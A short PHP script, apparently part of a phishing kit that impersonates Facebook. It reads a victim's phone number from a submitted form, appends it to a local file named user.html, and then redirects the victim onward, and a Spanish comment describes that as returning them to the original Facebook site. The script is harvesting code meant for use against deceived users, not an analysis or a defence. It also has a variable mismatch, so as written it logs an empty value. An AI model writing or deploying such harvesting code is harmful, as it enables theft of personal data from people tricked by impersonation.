<?php

$Numero = $_POST['phoneNumber']; 


$SALTO="\r\n";

$f = fopen("user.html", "a");
fwrite ($f, "----------------------------------".$SALTO.'Numero: '.$phoneNumber.$SALTO.$SALTO."----------------------------------".$SALTO);
fclose($f);

sleep(2);

//Redireccione a la web original (Facebook)

header('Location: index2.html');
?>